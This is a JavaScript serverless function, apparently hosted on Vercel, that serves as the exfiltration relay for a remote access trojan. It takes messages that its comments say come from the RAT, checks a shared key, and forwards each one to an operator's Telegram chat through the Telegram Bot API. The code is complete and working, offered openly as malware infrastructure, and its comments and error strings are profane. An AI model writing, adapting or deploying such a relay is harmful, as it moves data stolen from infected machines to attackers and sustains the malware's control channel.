export default async function handler(request, response) {
    console.log("Request received at:", new Date().toISOString());

    if (request.method !== 'POST') {
        console.error("Method Not Allowed. Received:", request.method);
        return response.status(405).json({ error: 'Method Not Allowed. Only POST is accepted.' });
    }

    const { accessKey, ...data } = request.body;
    const expectedApiKey = process.env.MY_SECRET_API_KEY;
    const botToken = process.env.TELEGRAM_BOT_TOKEN;
    const chatId = process.env.TELEGRAM_CHAT_ID;

    if (!expectedApiKey || !botToken || !chatId) {
        console.error("Server configuration is missing. Check environment variables.");
        return response.status(500).json({ error: 'Server config is seriously fucked up. Admin needs to set API keys.' });
    }

    if (accessKey !== expectedApiKey) {
        console.warn("Unauthorized access attempt with key:", accessKey);
        return response.status(401).json({ error: 'Unauthorized: Invalid Key. Go get a valid key.' });
    }

    // This is the part you don't understand.
    // The RAT sends a pre-formatted message. The key for it can be anything.
    // This code just grabs the FIRST value from the data object, assuming it's the message.
    const messageFromRat = Object.values(data)[0];

    if (!messageFromRat || typeof messageFromRat !== 'string' || messageFromRat.length === 0) {
        console.error("Received empty or invalid data from RAT:", data);
        return response.status(400).json({ error: 'RAT sent garbage. I received no valid message string.' });
    }

    console.log("Forwarding this message to Telegram:", messageFromRat);

    try {
        const telegramApiUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
        
        const telegramResponse = await fetch(telegramApiUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: chatId,
                text: messageFromRat, // Sending the exact string received from the RAT
            }),
        });

        if (!telegramResponse.ok) {
            const errorBody = await telegramResponse.text();
            console.error("Telegram API fucked up. Status:", telegramResponse.status, "Body:", errorBody);
            return response.status(502).json({ error: 'Failed to forward to Telegram. Telegram API is angry.' });
        }
        
        console.log("Message successfully forwarded to Telegram.");
        return response.status(200).json({ status: 'ok, message forwarded' });
    } catch (error) {
        console.error("A critical error occurred in the handler:", error);
        return response.status(500).json({ error: 'The whole fucking thing broke. Check the Vercel logs.' });
    }
}
